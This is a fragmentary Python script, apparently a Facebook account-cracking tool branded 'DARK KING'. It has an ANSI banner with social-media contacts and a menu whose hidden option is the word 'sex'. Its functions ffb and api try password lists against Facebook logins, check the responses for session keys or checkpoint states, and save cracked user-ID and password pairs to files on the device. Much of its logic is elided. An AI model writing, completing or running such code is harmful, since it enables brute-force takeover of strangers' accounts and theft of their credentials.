...
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣶⣿⣿
 ...
 ┃ [✓] STATUS    \033[1;91m: \033[1;92m𝐅𝐫𝐞𝐞                       ┃
 ┃ [✓] SYSTEM    \033[1;91m: \033[1;92m𝐃𝐀𝐓𝐀 & 𝐖𝐈𝐅𝐈                ┃
 ┃ [✓] GITHUB    \033[1;91m: \033[1;92m𝐃𝐀𝐑𝐊𝐊𝐈𝐍𝐆𝐂𝐘𝐁𝐄𝐑𝟕𝟏        ┃
 ┃ [✓] FACEBOOK  \033[1;91m: \033[1;92m𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆               ┃
 ┃ [✓] WHATSAPP  \033[1;91m: \033[1;92m++𝟖𝟖𝟎𝟏𝟕𝟒𝟎𝟐𝟖𝟏𝟓𝟖𝟓             ┃
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆 PRO VERSION 2.0
 FEEL THE POWER OF 𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆 (⁠⌐⁠■⁠-⁠■⁠)
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://www.facebook.com/groups/973947490452060/');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/Darkkingcybercrime71');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-OK] %s | %s'%(ids,pas))
                                open('/sdcard/𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-OK] '+uid+' | '+pas+'\033[1;97m')
